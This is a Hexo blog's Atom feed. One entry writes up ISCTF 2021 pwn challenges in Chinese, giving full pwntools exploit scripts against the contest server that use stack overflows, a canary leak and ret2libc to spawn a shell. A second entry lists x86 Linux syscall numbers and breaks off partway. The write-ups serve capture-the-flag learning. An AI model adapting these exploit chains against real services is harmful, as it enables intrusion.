<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <author>
    <name>haoo</name>
  </author>
  <generator uri="https://hexo.io/">Hexo</generator>
  <id>http://example.com/</id>
  <link href="http://example.com/" rel="alternate"/>
  <link href="http://example.com/rss.xml" rel="self"/>
  <rights>All rights reserved 2026, haoo</rights>
  <subtitle>Pwn / CTF writeups, binary exploitation notes, and practice logs.</subtitle>
  <title>haoo's pwn house</title>
  <updated>2026-04-24T06:10:47.988Z</updated>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    <content>
      <![CDATA[<h1 id="杰哥的nc"><a href="#杰哥的nc" class="headerlink" title="杰哥的nc"></a>杰哥的nc</h1><p>一道有意思的nc题目，没有给我们附件，直接nc连接一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ python3 nc_exp.py <br>[+] Opening connection to challenge.imxbt.cn on port 30501: Done<br>[*] Switching to interactive mode<br>$ ls<br>bin<br>dev<br>flag<br>lib<br>lib64<br>pwn<br>[*] Got EOF while reading in interactive<br>$  <br></code></pre></td></tr></table></figure><p>输入一次ls后，就退出程序，此时发现了flag文件，是不是直接cat flag就能获得flag？试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ python3 nc_exp.py <br>[+] Opening connection to challenge.imxbt.cn on port 30501: Done<br>[*] Switching to interactive mode<br>$ cat flag<br>$ ls<br>ls<br>$  <br></code></pre></td></tr></table></figure><p>发现并没有给flag，而是只执行了一个裸的cat命令，因为当cat没带文件参数时，会从stdin读，因此我们输入ls，它就会读取这个ls并将其输出出来。此时我猜测这个程序是不是只能执行第一个指令，下面来验证一下这个猜想是否成立</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ python3 nc_exp.py <br>[+] Opening connection to challenge.imxbt.cn on port 30501: Done<br>[*] Switching to interactive mode<br>$ ls -l<br>bin<br>dev<br>flag<br>lib<br>lib64<br>pwn<br>[*] Got EOF while reading in interactive<br>$ <br>[*] Closed connection to challenge.imxbt.cn port 30501<br>$ ls -l<br>total 4<br>-rwxrwxrwx 1 haoo haoo 73 Apr 24 09:01 nc_exp.py<br></code></pre></td></tr></table></figure><p>由此可知我的猜测完全正确，我们并没有获取到真正的shell，输入&#x2F;bin&#x2F;sh或者$0启动一个真正的shell，接着再读取flag就行了。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io = remote(&quot;challenge.imxbt.cn&quot;,30501)<br>io.sendline(b&quot;/bin/sh&quot;)<br>io.sendline(b&quot;cat flag&quot;)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="救救小肥鲨吧"><a href="#救救小肥鲨吧" class="headerlink" title="救救小肥鲨吧"></a>救救小肥鲨吧</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ checksec help_my_shark<br>[*] &#x27;/mnt/d/国内赛/ISCTF_2021/help_my_shark&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>32位没有开启什么保护，将其放入ida里面看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __cdecl func(int a1)<br>&#123;<br>  char s[36]; // [esp+0h] [ebp-28h] BYREF<br><br>  printf(&quot;help me : &quot;);<br>  gets(s);<br>  if ( a1 == 0xBEECAFEE )<br>    return system(&quot;/bin/sh&quot;);<br>  else<br>    return puts(&quot;Oh,no&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>存在gets函数，说明有栈溢出漏洞，存在system函数和”&#x2F;bin&#x2F;sh”字符串，因此思路就是利用栈溢出覆盖返回地址为system函数的地址，再将”&#x2F;bin&#x2F;sh”字符串作为参数传入system函数里面，从而获取shell。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./help_my_shark&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(&#x27;./help_my_shark&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;challenge.imxbt.cn&#x27;<br>    port=30774<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = lambda data : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>system_addr = elf.plt[&#x27;system&#x27;]<br>bin_sh = 0x080485EB<br>#gdb.attach(io)<br>payload = cyclic(0x28 + 4) + p32(system_addr) + p32(0) + p32(bin_sh)<br>sl(payload)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="金丝雀"><a href="#金丝雀" class="headerlink" title="金丝雀"></a>金丝雀</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF_2021/金丝雀&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      Canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>一道64位题目，开启了canary保护，但没有开启NX保护，可以只要知道栈上的地址，感觉就可以打shellcode，放入ida中看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf_[32]; // [rsp+0h] [rbp-50h] BYREF<br>  char buf[40]; // [rsp+20h] [rbp-30h] BYREF<br>  unsigned __int64 v6; // [rsp+48h] [rbp-8h]<br><br>  v6 = __readfsqword(0x28u);<br>  setvbuf(stdout, 0, 2, 0);<br>  setvbuf(stdin, 0, 2, 0);<br>  puts(&quot;Welcome ISCTF!&quot;);<br>  puts(&quot;Tell me your name&quot;);<br>  read(0, buf, 0x100u);<br>  printf(&quot;Ok %s,Do you kown PWN?,It&#x27;s 0x464c4147 right!\n&quot;, buf);<br>  read(0, buf_, 0x100u);<br>  puts(&quot;Ok bey!&quot;);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在明显的栈溢出，而且可以利用printf函数泄漏canary的值，再仔细观察可以发现catflag函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int catflag()<br>&#123;<br>  return system(&quot;/bin/sh&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么思路就明确了，首先通过printf函数泄露出canary的值，接着再利用栈溢出覆盖返回地址为catflag函数的地址，获取shell即可。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./金丝雀&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(&#x27;./金丝雀&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;challenge.imxbt.cn&#x27;<br>    port=32477<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = lambda data : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>catflag_addr = 0x4011D6<br>ret = 0x000000000040101a<br><br>payload = b&quot;a&quot;*40<br>sl(payload)<br>io.recvuntil(b&quot;a&quot;*40)<br>canary = u64(io.recv(8)) - 0xa<br>leak(&quot;canary&quot;,canary)<br><br>payload = cyclic(0x50 - 8) + p64(canary) + p64(ret) + p64(ret) + p64(catflag_addr)<br>sl(payload)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="Diceney-level1"><a href="#Diceney-level1" class="headerlink" title="Diceney-level1"></a>Diceney-level1</h1><p>这道题是一个猜数的程序，当变量win为20时，就可以获得shell了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int input; // [rsp+8h] [rbp-28h]<br>int win; // [rsp+Ch] [rbp-24h]<br>*(&amp;input + i % 4) = input;<br></code></pre></td></tr></table></figure><p>发现了一个关键点，就是我们输入的input的值会赋值给*(&amp;input + i % 4)处的变量，而win在&amp;input+1处，因此只需要i%4等于1，此时我们输入20，就相当于把20赋值给了win，从而我们就可以获得shell了。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./Diceney-level1&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(&#x27;./Diceney-level1&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;challenge.imxbt.cn&#x27;<br>    port=31068<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = lambda data : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>sl(b&quot;1&quot;)<br>sl(b&quot;20&quot;)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="小肥鲨的疑惑"><a href="#小肥鲨的疑惑" class="headerlink" title="小肥鲨的疑惑"></a>小肥鲨的疑惑</h1><p>一道简单的ret2libc题目，直接打就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./小肥鲨的疑惑&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(&#x27;./小肥鲨的疑惑&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;challenge.imxbt.cn&#x27;<br>    port=30687<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = lambda data : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>pop_rdi = 0x0000000000400783<br>ret = 0x0000000000400506<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>main = 0x4006D4<br><br>io.recvuntil(&quot;Now start your play:\n\n&quot;)<br><br>payload = cyclic(0x20+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>sl(payload)<br>leak_addr = io.recvuntil(b&#x27;\n&#x27;, drop=True)<br>puts_addr = u64(leak_addr.ljust(8, b&#x27;\x00&#x27;))<br>libc_base = puts_addr - 0x06f6a0<br>leak(&quot;libc_base&quot;,libc_base)<br>bin_sh = libc_base + 0x18ce57<br>system = libc_base + 0x0453a0<br><br>payload = cyclic(0x28) + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(0)<br>sl(payload)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>]]>
    </content>
    <id>http://example.com/2026/04/24/ISCTF-2021-pwn/</id>
    <link href="http://example.com/2026/04/24/ISCTF-2021-pwn/"/>
    <published>2026-04-24T06:10:47.000Z</published>
    <summary>
      <![CDATA[<h1 id="杰哥的nc"><a href="#杰哥的nc" class="headerlink" title="杰哥的nc"></a>杰哥的nc</h1><p>一道有意思的nc题目，没有给我们附件，直接nc连接一下</p>
<figure class="highlight p]]>
    </summary>
    <title>ISCTF_2021_pwn</title>
    <updated>2026-04-24T06:10:47.988Z</updated>
  </entry>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="系统调用号" scheme="http://example.com/categories/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/"/>
    <category term="系统调用号" scheme="http://example.com/tags/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/"/>
    <content>
      <![CDATA[<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ifndef _ASM_X86_UNISTD_32_H<br>#define _ASM_X86_UNISTD_32_H 1<br><br>#define NR_restart_syscall 0<br>#define NR_exit 1<br>#define NR_fork 2<br>#define NR_read 3<br>#define NR_write 4<br>#define NR_open 5<br>#define NR_close 6<br>#define NR_waitpid 7<br>#define NR_creat 8<br>#define NR_link 9<br>#define NR_unlink 10<br>#define NR_execve 11<br>#define NR_chdir 12<br>#define NR_time 13<br>#define NR_mknod 14<br>#define NR_chmod 15<br>#define NR_lchown 16<br>#define NR_break 17<br>#define NR_oldstat 18<br>#define NR_lseek 19<br>#define NR_getpid 20<br>#define NR_mount 21<br>#define NR_umount 22<br>#define NR_setuid 23<br>#define NR_getuid 24<br>#define NR_stime 25<br>#define NR_ptrace 26<br>#define NR_alarm 27<br>#define NR_oldfstat 28<br>#define NR_pause 29<br>#define NR_utime 30<br>#define NR_stty 31<br>#define NR_gtty 32<br>#define NR_access 33<br>#define NR_nice 34<br>#define NR_ftime 35<br>#define NR_sync 36<br>#define NR_kill 37<br>#define NR_rename 38<br>#define NR_mkdir 39<br>#define NR_rmdir 40<br>#define NR_dup 41<br>#define NR_pipe 42<br>#define NR_times 43<br>#define NR_prof 44<br>#define NR_brk 45<br>#define NR_setgid 46<br>#define NR_getgid 47<br>#define NR_signal 48<br>#define NR_geteuid 49<br>#define NR_getegid 50<br>#define NR_acct 51<br>#define NR_umount2 52<br>#define NR_lock 53<br>#define NR_ioctl 54<br>#define NR_fcntl 55<br>#define NR_mpx 56<br>#define NR_setpgid 57<br>#define NR_ulimit 58<br>#define NR_oldolduname 59<br>#define NR_umask 60<br>#define NR_chroot 61<br>#define NR_ustat 62<br>#define NR_dup2 63<br>#define NR_getppid 64<br>#define NR_getpgrp 65<br>#define NR_setsid 66<br>#define NR_sigaction 67<br>#define NR_sgetmask 68<br>#define NR_ssetmask 69<br>#define NR_setreuid 70<br>#define NR_setregid 71<br>#define NR_sigsuspend 72<br>#define NR_sigpending 73<br>#define NR_sethostname 74<br>#define NR_setrlimit 75<br>#define NR_getrlimit 76<br>#define NR_getrusage 77<br>#define NR_gettimeofday 78<br>#define NR_settimeofday 79<br>#define NR_getgroups 80<br>#define NR_setgroups 81<br>#define NR_select 82<br>#define NR_symlink 83<br>#define NR_oldlstat 84<br>#define NR_readlink 85<br>#define NR_uselib 86<br>#define NR_swapon 87<br>#define NR_reboot 88<br>#define NR_readdir 89<br>#define NR_mmap 90<br>#define NR_munmap 91<br>#define NR_truncate 92<br>#define NR_ftruncate 93<br>#define NR_fchmod 94<br>#define NR_fchown 95<br>#define NR_getpriority 96<br>#define NR_setpriority 97<br>#define NR_profil 98<br>#define NR_statfs 99<br>#define NR_fstatfs 100<br>#define NR_ioperm 101<br>#define NR_socketcall 102<br>#define NR_syslog 103<br>#define NR_setitimer 104<br>#define NR_getitimer 105<br>#define NR_stat 106<br>#define NR_lstat 107<br>#define NR_fstat 108<br>#define NR_olduname 109<br>#define NR_iopl 110<br>#define NR_vhangup 111<br>#define NR_idle 112<br>#define NR_vm86old 113<br>#define NR_wait4 114<br>#define NR_swapoff 115<br>#define NR_sysinfo 116<br>#define NR_ipc 117<br>#define NR_fsync 118<br>#define NR_sigreturn 119<br>#define NR_clone 120<br>#define NR_setdomainname 121<br>#define NR_uname 122<br>#define NR_modify_ldt 123<br>#define NR_adjtimex 124<br>#define NR_mprotect 125<br>#define NR_sigprocmask 126<br>#define NR_create_module 127<br>#define NR_init_module 128<br>#define NR_delete_module 129<br>#define NR_get_kernel_syms 130<br>#define NR_quotactl 131<br>#define NR_getpgid 132<br>#define NR_fchdir 133<br>#define NR_bdflush 134<br>#define NR_sysfs 135<br>#define NR_personality 136<br>#define NR_afs_syscall 137<br>#define NR_setfsuid 138<br>#define NR_setfsgid 139<br>#define NRllseek 140<br>#define NR_getdents 141<br>#define NRnewselect 142<br>#define NR_flock 143<br>#define NR_msync 144<br>#define NR_readv 145<br>#define NR_writev 146<br>#define NR_getsid 147<br>#define NR_fdatasync 148<br>#define NRsysctl 149<br>#define NR_mlock 150<br>#define NR_munlock 151<br>#define NR_mlockall 152<br>#define NR_munlockall 153<br>#define NR_sched_setparam 154<br>#define NR_sched_getparam 155<br>#define NR_sched_setscheduler 156<br>#define NR_sched_getscheduler 157<br>#define NR_sched_yield 158<br>#define NR_sched_get_priority_max 159<br>#define NR_sched_get_priority_min 160<br>#define NR_sched_rr_get_interval 161<br>#define NR_nanosleep 162<br>#define NR_mremap 163<br>#define NR_setresuid 164<br>#define NR_getresuid 165<br>#define NR_vm86 166<br>#define NR_query_module 167<br>#define NR_poll 168<br>#define NR_nfsservctl 169<br>#define NR_setresgid 170<br>#define NR_getresgid 171<br>#define NR_prctl 172<br>#define NR_rt_sigreturn 173<br>#define NR_rt_sigaction 174<br>#define NR_rt_sigprocmask 175<br>#define NR_rt_sigpending 176<br>#define NR_rt_sigtimedwait 177<br>#define NR_rt_sigqueueinfo 178<br>#define NR_rt_sigsuspend 179<br>#define NR_pread64 180<br>#define NR_pwrite64 181<br>#define NR_chown 182<br>#define NR_getcwd 183<br>#define NR_capget 184<br>#define NR_capset 185<br>#define NR_sigaltstack 186<br>#define NR_sendfile 187<br>#define NR_getpmsg 188<br>#define NR_putpmsg 189<br>#define NR_vfork 190<br>#define NR_ugetrlimit 191<br>#define NR_mmap2 192<br>#define NR_truncate64 193<br>#define NR_ftruncate64 194<br>#define NR_stat64 195<br>#define NR_lstat64 196<br>#define NR_fstat64 197<br>#define NR_lchown32 198<br>#define NR_getuid32 199<br>#define NR_getgid32 200<br>#define NR_geteuid32 201<br>#define NR_getegid32 202<br>#define NR_setreuid32 203<br>#define NR_setregid32 204<br>#define NR_getgroups32 205<br>#define NR_setgroups32 206<br>#define NR_fchown32 207<br>#define NR_setresuid32 208<br>#define NR_getresuid32 209<br>#define NR_setresgid32 210<br>#define NR_getresgid32 211<br>#define NR_chown32 212<br>#define NR_setuid32 213<br>#define NR_setgid32 214<br>#define NR_setfsuid32 215<br>#define NR_setfsgid32 216<br>#define NR_pivot_root 217<br>#define NR_mincore 218<br>#define NR_madvise 219<br>#define NR_getdents64 220<br>#define NR_fcntl64 221<br>#define NR_gettid 224<br>#define NR_readahead 225<br>#define NR_setxattr 226<br>#define NR_lsetxattr 227<br>#define NR_fsetxattr 228<br>#define NR_getxattr 229<br>#define NR_lgetxattr 230<br>#define NR_fgetxattr 231<br>#define NR_listxattr 232<br>#define NR_llistxattr 233<br>#define NR_flistxattr 234<br>#define NR_removexattr 235<br>#define NR_lremovexattr 236<br>#define NR_fremovexattr 237<br>#define NR_tkill 238<br>#define NR_sendfile64 239<br>#define NR_futex 240<br>#define NR_sched_setaffinity 241<br>#define NR_sched_getaffinity 242<br>#define NR_set_thread_area 243<br>#define NR_get_thread_area 244<br>#define NR_io_setup 245<br>#define NR_io_destroy 246<br>#define NR_io_getevents 247<br>#define NR_io_submit 248<br>#define NR_io_cancel 249<br>#define NR_fadvise64 250<br>#define NR_exit_group 252<br>#define NR_lookup_dcookie 253<br>#define NR_epoll_create 254<br>#define NR_epoll_ctl 255<br>#define NR_epoll_wait 256<br>#define NR_remap_file_pages 257<br>#define NR_set_tid_address 258<br>#define NR_timer_create 259<br>#define NR_timer_settime 260<br>#define NR_timer_gettime 261<br>#define NR_timer_getoverrun 262<br>#define NR_timer_delete 263<br>#define NR_clock_settime 264<br>#define NR_clock_gettime 265<br>#define NR_clock_getres 266<br>#define NR_clock_nanosleep 267<br>#define NR_statfs64 268<br>#define NR_fstatfs64 269<br>#define NR_tgkill 270<br>#define NR_utimes 271<br>#define NR_fadvise64_64 272<br>#define NR_vserver 273<br>#define NR_mbind 274<br>#define NR_get_mempolicy 275<br>#define NR_set_mempolicy 276<br>#define NR_mq_open 277<br>#define NR_mq_unlink 278<br>#define NR_mq_timedsend 279<br>#define NR_mq_timedreceive 280<br>#define NR_mq_notify 281<br>#define NR_mq_getsetattr 282<br>#define NR_kexec_load 283<br>#define NR_waitid 284<br>#define NR_add_key 286<br>#define NR_request_key 287<br>#define NR_keyctl 288<br>#define NR_ioprio_set 289<br>#define NR_ioprio_get 290<br>#define NR_inotify_init 291<br>#define NR_inotify_add_watch 292<br>#define NR_inotify_rm_watch 293<br>#define NR_migrate_pages 294<br>#define NR_openat 295<br>#define NR_mkdirat 296<br>#define NR_mknodat 297<br>#define NR_fchownat 298<br>#define NR_futimesat 299<br>#define NR_fstatat64 300<br>#define NR_unlinkat 301<br>#define NR_renameat 302<br>#define NR_linkat 303<br>#define NR_symlinkat 304<br>#define NR_readlinkat 305<br>#define NR_fchmodat 306<br>#define NR_faccessat 307<br>#define NR_pselect6 308<br>#define NR_ppoll 309<br>#define NR_unshare 310<br>#define NR_set_robust_list 311<br>#define NR_get_robust_list 312<br>#define NR_splice 313<br>#define NR_sync_file_range 314<br>#define NR_tee 315<br>#define NR_vmsplice 316<br>#define NR_move_pages 317<br>#define NR_getcpu 318<br>#define NR_epoll_pwait 319<br>#define NR_utimensat 320<br>#define NR_signalfd 321<br>#define NR_timerfd_create 322<br>#define NR_eventfd 323<br>#define NR_fallocate 324<br>#define NR_timerfd_settime 325<br>#define NR_timerfd_gettime 326<br>#define NR_signalfd4 327<br>#define NR_eventfd2 328<br>#define NR_epoll_create1 329<br>#define NR_dup3 330<br>#define NR_pipe2 